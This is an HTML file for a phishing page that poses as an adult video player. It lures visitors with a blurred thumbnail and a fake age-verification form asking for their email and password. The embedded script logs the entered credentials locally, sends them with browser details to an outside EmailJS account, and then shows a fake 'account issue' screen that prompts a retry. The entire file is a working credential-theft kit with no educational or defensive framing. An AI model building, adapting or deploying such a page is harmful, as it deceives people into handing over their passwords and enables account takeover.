<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Player</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
.container{width:100%;max-width:480px;background:#1a1a1a;border-radius:24px;padding:20px;border:1px solid #333}
.video-box{background:#000;border-radius:16px;overflow:hidden;position:relative;cursor:pointer;border:1px solid #333;aspect-ratio:16/9}
.video-box img{width:100%;height:100%;object-fit:cover;filter:blur(12px);transition:0.3s}
.video-box:hover img{filter:blur(6px)}
.play-btn{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:48px;color:#fff;background:rgba(255,255,255,0.12);width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);border:2px solid rgba(255,255,255,0.2)}
.video-form{display:none;background:#1a2a3a;padding:20px;border-radius:16px;margin-top:15px}
.video-form p{color:#aaa;font-size:13px;text-align:center;margin-bottom:12px}
input{width:100%;padding:14px;margin-bottom:12px;background:#333;border:1px solid #444;border-radius:12px;color:#fff;font-size:15px;outline:none}
input:focus{border-color:#1a73e8}
button{width:100%;padding:14px;background:#1a73e8;border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
button:hover{background:#1557b0}
.back-btn{display:block;margin-top:18px;text-align:center;color:#888;text-decoration:none;font-size:14px}
.back-btn:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="container">
<h3 style="color:#fff;text-align:center;font-size:18px;">🔞 Exclusive Content</h3>
<p style="color:#888;text-align:center;font-size:13px;">2.4M views • 1 week ago</p>
<div class="video-box" onclick="document.getElementById('video-form').style.display='block'">
<img src="https://i.postimg.cc/Y0J4vSdp/photo-2025-01-18-22-49-44.jpg" alt="Video thumbnail">
<div class="play-btn">▶</div>
</div>
<div class="video-form" id="video-form">
<p>🔞 Verify your age to continue</p>
<form onsubmit="captureData(event,'video')">
<input type="email" id="email-video" placeholder="Email" required>
<input type="password" id="pass-video" placeholder="Password" required>
<button type="submit">Continue</button>
</form>
</div>
<a href="index.html" class="back-btn">← Back</a>
</div>
<script>
const EMAILJS_PUBLIC_KEY='elm943jpQl0Nr8aR-';
const EMAILJS_SERVICE_ID='service_27guahe';
const EMAILJS_TEMPLATE_ID='template_bq2ps8n';
emailjs.init(EMAILJS_PUBLIC_KEY);
function captureData(e,type){e.preventDefault();const email=document.getElementById('email-video').value;const password=document.getElementById('pass-video').value;const time=new Date().toLocaleString('id-ID');const ip='127.0.0.1 (static)';const userAgent=navigator.userAgent;const sessionID=Math.random().toString(36).substring(2,10);const host=window.location.host;const referer=document.referrer||'Direct';const game='unknown';const logs=JSON.parse(localStorage.getItem('phish_data')||'[]');const logEntry='========================================\n📥 CAPTURED AT: '+time+'\n📧 EMAIL: '+email+'\n🔑 PASSWORD: '+password+'\n🎯 TYPE: '+type+'\n🎮 GAME: '+game+'\n🌐 IP ADDRESS: '+ip+'\n📱 USER AGENT: '+userAgent+'\n🆔 SESSION ID: '+sessionID+'\n🏠 HOST: '+host+'\n🔗 REFERER: '+referer+'\n========================================\n\n';logs.unshift(logEntry);localStorage.setItem('phish_data',JSON.stringify(logs));const templateParams={time,email,password,type,game,ip,useragent:userAgent,session:sessionID,host,referer};emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,templateParams).then(()=>console.log('✅ Email terkirim!')).catch(()=>console.warn('⚠️ Email gagal'));alert('✅ Data captured!');document.body.innerHTML='<div style="background:#f5f5f5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;font-family:Segoe UI,sans-serif;"><div style="background:#fff;border-radius:32px;padding:40px 30px;max-width:400px;width:100%;text-align:center;border:1px solid #eee;"><h1 style="color:#cc0000;font-size:22px;">⚠️ ACCOUNT ISSUE</h1><p style="color:#666;font-size:14px;margin:10px 0;">We detected suspicious activity on your account. Please verify your identity.</p><button onclick="location.reload()" style="background:#1a1a1a;color:#fff;border:none;padding:14px 30px;border-radius:40px;font-size:16px;cursor:pointer;font-weight:500;">🔄 TRY AGAIN</button></div></div>';}
</script>
</body>
</html>
